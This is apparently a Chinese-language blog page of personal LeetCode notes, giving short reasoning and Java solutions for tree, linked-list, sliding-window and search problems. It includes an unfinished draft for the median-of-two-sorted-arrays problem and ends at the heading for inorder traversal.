<h3 id="4-寻找两个正序数组的中位数"><a href="#4-寻找两个正序数组的中位数" class="headerlink" title="4. 寻找两个正序数组的中位数"></a><a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/">4. 寻找两个正序数组的中位数</a></h3><p>分析题目：朴素算法，合并数组，或者使用堆，或者使用双指针，都比较好写。现在看效率高的写法，要求时间复杂度为log，所以必然是二分。二分的目的是减少答案范围。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nums1: left1 right1 mid1 a b</span><br><span class="line">nums2: left2 right2 mid2 c d</span><br><span class="line">定义函数find(int[] nums1, int[] nums2, int k) 为找到第k小的数。（怎么感觉能用快排思想或者堆了）</span><br><span class="line">如果nums[mid1] &lt; nums[mid2] 那么一定有： </span><br><span class="line">a &lt; b</span><br><span class="line">a &lt; d </span><br><span class="line">c &lt; d</span><br><span class="line"></span><br><span class="line">如果 k 大于等于（大概这个范围可能不是等于写代码时在确定） 数组长度一半 肯定能排除a</span><br><span class="line">如果k 小于数组长度一半 那么可以排除 d</span><br><span class="line">如果nums[mid1] &gt; nums[mid2] 那么一定有： </span><br><span class="line">a &lt; b</span><br><span class="line">c &lt; b</span><br><span class="line">c &lt; d</span><br><span class="line">如果 k 大于等于（大概这个范围可能不是等于写代码时在确定） 数组长度，那么肯定能排除c</span><br><span class="line">如果k 小于数组长度一半 那么可以排除 b</span><br><span class="line"></span><br><span class="line">感觉其实思维也不一定要比较那么死，也可以把mid1 和 left2比，反正能够缩小范围就行（但这样只有小比较好缩范围，大了缩的范围比较小）</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">length1</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">    <span class="type">int</span> <span class="variable">length2</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">    <span class="keyword">if</span>(((length1 + length2) &amp; <span class="number">1</span>) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> (length1 + length2) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 2 4 -&gt;  2 3</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">k1</span> <span class="operator">=</span> (length1 + length2) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k2</span> <span class="operator">=</span> k1 - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span> left1, <span class="type">int</span> right1, <span class="type">int</span>[] nums2, <span class="type">int</span> left2, <span class="type">int</span> right2)</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h3><p>思路：滑动窗口</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLongestSubstring</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        Set&lt;Character&gt; record = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (right &lt; n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(record.contains(s.charAt(right)))&#123;</span><br><span class="line">                <span class="keyword">while</span> (left &lt; right &amp;&amp; record.contains(s.charAt(right)))&#123;</span><br><span class="line">                    record.remove(s.charAt(left));</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            record.add(s.charAt(right));</span><br><span class="line">            res = Integer.max(res, right - left + <span class="number">1</span>);</span><br><span class="line">            right++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo:题解还有动态规划写法，后面可以写下</p>
<h3 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2. 两数相加"></a><a href="https://leetcode.cn/problems/add-two-numbers/">2. 两数相加</a></h3><p>思路：模拟即可，使用c表示进位</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dummyNode;</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="literal">null</span> &amp;&amp; l2 != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> l1.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> l2.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> a + b + c;</span><br><span class="line">            c = sum / <span class="number">10</span>;</span><br><span class="line">            sum %= <span class="number">10</span>;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum);</span><br><span class="line">            cur.next = temp;</span><br><span class="line">            cur = temp;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> l1.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> a + b + c;</span><br><span class="line">            c = sum / <span class="number">10</span>;</span><br><span class="line">            sum %= <span class="number">10</span>;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum);</span><br><span class="line">            cur.next = temp;</span><br><span class="line">            cur = temp;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (l2 != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> l2.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> a + b + c;</span><br><span class="line">            c = sum / <span class="number">10</span>;</span><br><span class="line">            sum %= <span class="number">10</span>;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum);</span><br><span class="line">            cur.next = temp;</span><br><span class="line">            cur = temp;</span><br><span class="line">            l2 = l2.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(c == <span class="number">1</span>) cur.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> dummyNode.next;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写得有点丑陋，可以三种情况合在一起写；</p>
<h3 id="79-单词搜索"><a href="#79-单词搜索" class="headerlink" title="79. 单词搜索"></a><a href="https://leetcode.cn/problems/word-search/">79. 单词搜索</a></h3><p>思路：搜索</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> res;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">DIRECTION_NUM</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">exist</span><span class="params">(<span class="type">char</span>[][] board, String word)</span> &#123;</span><br><span class="line">        m = board.length;</span><br><span class="line">        n = board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">boolean</span>[][] visited = <span class="keyword">new</span> <span class="title class_">boolean</span>[m][n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dfs(board, word, i, j, <span class="number">0</span>, visited);</span><br><span class="line">                <span class="keyword">if</span>(res) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, String word, <span class="type">int</span> i, <span class="type">int</span> j, <span class="type">int</span> wordIndex, <span class="type">boolean</span>[][] visited)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(wordIndex == word.length())&#123;</span><br><span class="line">            res = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(res || i &lt; <span class="number">0</span> || i &gt;= m || j &lt; <span class="number">0</span> || j &gt;= n || visited[i][j]) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span>(word.charAt(wordIndex) != board[i][j]) <span class="keyword">return</span>;</span><br><span class="line">        <span class="type">int</span>[] dx = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] dy = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        visited[i][j] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; DIRECTION_NUM &amp;&amp; !res; k++) &#123;</span><br><span class="line">            dfs(board, word, i + dx[k], j + dy[k], wordIndex + <span class="number">1</span>, visited);</span><br><span class="line">        &#125;</span><br><span class="line">        visited[i][j] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="114-二叉树展开为链表"><a href="#114-二叉树展开为链表" class="headerlink" title="114. 二叉树展开为链表"></a><a href="https://leetcode.cn/problems/flatten-binary-tree-to-linked-list/">114. 二叉树展开为链表</a></h3><p>思路：递归，类似先序遍历，遍历过程中记录前个结点，边遍历边修改</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    TreeNode lastVisitedNode;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flatten</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        preTravel(root);</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode <span class="title function_">preTravel</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        lastVisitedNode = root;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">leftTravel</span> <span class="operator">=</span> preTravel(root.left);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">rightNode</span> <span class="operator">=</span> root.right;</span><br><span class="line">        <span class="keyword">if</span>(leftTravel != <span class="literal">null</span>)&#123;</span><br><span class="line">            root.right = leftTravel;</span><br><span class="line">            lastVisitedNode.right = rightNode;</span><br><span class="line">            preTravel(rightNode);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            preTravel(rightNode);</span><br><span class="line">        &#125;</span><br><span class="line">        root.left = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看题解更简单的解法(todo:感觉没看太懂怎样就连起来了)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    TreeNode* preNode;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">flatten</span><span class="params">(TreeNode* root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == NULL) <span class="keyword">return</span>;</span><br><span class="line">        flatten(root-&gt;right);</span><br><span class="line">        flatten(root-&gt;left);</span><br><span class="line">        root-&gt;left = NULL;</span><br><span class="line">        root-&gt;right = preNode;</span><br><span class="line">        preNode = root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>todo：不使用递归写法完成该题</p>
<h3 id="621-任务调度器"><a href="#621-任务调度器" class="headerlink" title="621. 任务调度器"></a><a href="https://leetcode.cn/problems/task-scheduler/">621. 任务调度器</a></h3><p>思路：感觉贪心就行。肯定先做数量最多的任务列表，然后做第二多（可能跟最多相等）的，其它后面插进来 。然后证明结果肯定能够满足条件</p>
<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int leastInterval(char[] tasks, int n) &#123;</span><br><span class="line">        int[] record = new int[26];</span><br><span class="line">        for (char task : tasks) &#123;</span><br><span class="line">            record[task - &#x27;A&#x27;]++;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(record);</span><br><span class="line">        int minLength = (record[25] - 1) * (n + 1) + 1;</span><br><span class="line">        for(int j = 24; j &gt;= 0; j--)&#123;</span><br><span class="line">            if(record[j] == record[25])&#123;</span><br><span class="line">                minLength++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return Integer.max(minLength, tasks.length);        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="617-合并二叉树"><a href="#617-合并二叉树" class="headerlink" title="617. 合并二叉树"></a><a href="https://leetcode.cn/problems/merge-two-binary-trees/">617. 合并二叉树</a></h3><p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public TreeNode mergeTrees(TreeNode root1, TreeNode root2) &#123;</span><br><span class="line">        if(root1 == null &amp;&amp; root2 == null) return null;</span><br><span class="line">        int a = 0;</span><br><span class="line">        int b = 0;</span><br><span class="line">        TreeNode roo1Left = null;</span><br><span class="line">        TreeNode root1Right = null;</span><br><span class="line">        TreeNode root2Left = null;</span><br><span class="line">        TreeNode root2Right = null;</span><br><span class="line">        if(root1 != null)&#123;</span><br><span class="line">            a = root1.val;</span><br><span class="line">            roo1Left = root1.left;</span><br><span class="line">            root1Right = root1.right;</span><br><span class="line">        &#125;</span><br><span class="line">        if(root2 != null)&#123;</span><br><span class="line">            b = root2.val;</span><br><span class="line">            root2Left = root2.left;</span><br><span class="line">            root2Right = root2.right;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode root = new TreeNode(a + b);</span><br><span class="line">        root.left = mergeTrees(roo1Left, root2Left);</span><br><span class="line">        root.right = mergeTrees(root1Right, root2Right);</span><br><span class="line">        return root;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写得不够简洁，但我这种写法是都创建了新的结点。</p>
<p>下面结点，复用了一些结点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public TreeNode mergeTrees(TreeNode t1, TreeNode t2) &#123;</span><br><span class="line">        if (t1 == null) &#123;</span><br><span class="line">            return t2;</span><br><span class="line">        &#125;</span><br><span class="line">        if (t2 == null) &#123;</span><br><span class="line">            return t1;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode merged = new TreeNode(t1.val + t2.val);</span><br><span class="line">        merged.left = mergeTrees(t1.left, t2.left);</span><br><span class="line">        merged.right = mergeTrees(t1.right, t2.right);</span><br><span class="line">        return merged;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="105-从前序与中序遍历序列构造二叉树"><a href="#105-从前序与中序遍历序列构造二叉树" class="headerlink" title="105. 从前序与中序遍历序列构造二叉树"></a><a href="https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-inorder-traversal/">105. 从前序与中序遍历序列构造二叉树</a></h3><p>思路：常规题目，无需多言。为了加快查找速度，可以使用hash表，记录值和在inorder 中的索引关系</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; record = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span>[] inorder)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; inorder.length; i++) &#123;</span><br><span class="line">            record.put(inorder[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> buildTree(preorder, <span class="number">0</span>, preorder.length - <span class="number">1</span>, inorder, <span class="number">0</span>, inorder.length - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">buildTree</span><span class="params">(<span class="type">int</span>[] preorder, <span class="type">int</span> i1,<span class="type">int</span> j1, <span class="type">int</span>[] inorder, <span class="type">int</span> i2, <span class="type">int</span> j2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(i1 &gt; j1) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(i1 == j1) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(preorder[i1]);</span><br><span class="line">        <span class="type">int</span> <span class="variable">rootVal</span> <span class="operator">=</span> preorder[i1];</span><br><span class="line">        <span class="type">int</span> <span class="variable">inorderIndex</span> <span class="operator">=</span> record.get(rootVal);</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(rootVal);</span><br><span class="line">        root.left = buildTree(preorder, i1 + <span class="number">1</span>, (i1 + <span class="number">1</span>) + (inorderIndex - <span class="number">1</span> - i2), inorder, i2, inorderIndex - <span class="number">1</span>);</span><br><span class="line">        root.right = buildTree(preorder, (i1 + <span class="number">1</span>) + (inorderIndex - <span class="number">1</span> - i2) + <span class="number">1</span>, j1, inorder, inorderIndex + <span class="number">1</span>, j2);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写得有点冗余了(但感觉我的写法好理解点)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    int[] preorder;</span><br><span class="line">    HashMap&lt;Integer, Integer&gt; dic = new HashMap&lt;&gt;();</span><br><span class="line">    public TreeNode buildTree(int[] preorder, int[] inorder) &#123;</span><br><span class="line">        this.preorder = preorder;</span><br><span class="line">        for(int i = 0; i &lt; inorder.length; i++)</span><br><span class="line">            dic.put(inorder[i], i);</span><br><span class="line">        return recur(0, 0, inorder.length - 1);</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode recur(int root, int left, int right) &#123;</span><br><span class="line">        if (left &gt; right) return null;                          // 递归终止</span><br><span class="line">        TreeNode node = new TreeNode(preorder[root]);          // 建立根节点</span><br><span class="line">        int i = dic.get(preorder[root]);                       // 划分根节点、左子树、右子树</span><br><span class="line">        node.left = recur(root + 1, left, i - 1);              // 开启左子树递归</span><br><span class="line">        node.right = recur(root + i - left + 1, i + 1, right); // 开启右子树递归</span><br><span class="line">        return node;                                           // 回溯返回根节点</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="80题了"><a href="#80题了" class="headerlink" title="80题了"></a>80题了</h3><h3 id="104-二叉树的最大深度"><a href="#104-二叉树的最大深度" class="headerlink" title="104. 二叉树的最大深度"></a><a href="https://leetcode.cn/problems/maximum-depth-of-binary-tree/">104. 二叉树的最大深度</a></h3><p>思路：递归</p>
<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int maxDepth(TreeNode root) &#123;</span><br><span class="line">        if(root == null) return 0;</span><br><span class="line">        return 1 + Integer.max(maxDepth(root.left), maxDepth(root.right));        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="102-二叉树的层序遍历"><a href="#102-二叉树的层序遍历" class="headerlink" title="102. 二叉树的层序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-level-order-traversal/">102. 二叉树的层序遍历</a></h3><p>思路：层次遍历队列即可</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">levelOrder</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        Deque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root != <span class="literal">null</span>) deque.addLast(root);</span><br><span class="line">        <span class="keyword">while</span> (!deque.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sz</span> <span class="operator">=</span> deque.size();</span><br><span class="line">            List&lt;Integer&gt; cur = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sz; i++) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.pollFirst();</span><br><span class="line">                cur.add(node.val);</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="literal">null</span>) deque.addLast(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>) deque.addLast(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">            res.add(cur);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="101-对称二叉树"><a href="#101-对称二叉树" class="headerlink" title="101. 对称二叉树"></a><a href="https://leetcode.cn/problems/symmetric-tree/">101. 对称二叉树</a></h3><p>思路：递归即可</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isSymmetric(root.left, root.right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSymmetric</span><span class="params">(TreeNode left, TreeNode right)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> &amp;&amp; right == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="literal">null</span> || right == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(left.val != right.val) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> isSymmetric(left.left, right.right) &amp; isSymmetric(left.right, right.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="98-验证二叉搜索树"><a href="#98-验证二叉搜索树" class="headerlink" title="98. 验证二叉搜索树"></a><a href="https://leetcode.cn/problems/validate-binary-search-tree/">98. 验证二叉搜索树</a></h3><p>思路：中序遍历即可（前序遍历后序遍历递归也可）</p>
<p>代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    boolean res = true;</span><br><span class="line">    boolean initFlag = false;</span><br><span class="line">    int preVal = 0;</span><br><span class="line">    public boolean isValidBST(TreeNode root) &#123;</span><br><span class="line">        dfs(root);</span><br><span class="line">        return res;</span><br><span class="line">    &#125;</span><br><span class="line">    void dfs(TreeNode root) &#123;</span><br><span class="line">        if(!res || root == null) return;</span><br><span class="line">        dfs(root.left);</span><br><span class="line">        if(!initFlag)&#123;</span><br><span class="line">            preVal = root.val;</span><br><span class="line">            initFlag = true;</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            if(preVal &gt;= root.val)&#123;</span><br><span class="line">                res = false;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            preVal = root.val;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="96-不同的二叉搜索树"><a href="#96-不同的二叉搜索树" class="headerlink" title="96. 不同的二叉搜索树"></a><a href="https://leetcode.cn/problems/unique-binary-search-trees/">96. 不同的二叉搜索树</a></h3><p>思路：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">固定根结点，左右个数遍历计算，最后加起来</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; record = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Solution</span><span class="params">()</span> &#123;</span><br><span class="line">        record.put(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numTrees</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">retVal</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> record.containsKey(i - <span class="number">1</span>) ? record.get(i - <span class="number">1</span>) : numTrees(i - <span class="number">1</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> record.containsKey(n - i) ? record.get(n - i) : numTrees(n - i);</span><br><span class="line">            retVal += left * right;</span><br><span class="line">        &#125;</span><br><span class="line">        record.put(n, retVal);</span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>备注：可以不用递归直接迭代也行</p>
<h3 id="94-二叉树的中序遍历"><a href="#94-二叉树的中序遍历" class="headerlink" title="94. 二叉树的中序遍历"></a><a href="https://leetcode.cn/problems/binary-tree-inorder-traversal/">94. 二叉树的中序遍历</a></h3><p>思路：中序遍历</p>
<p>代码：</p>
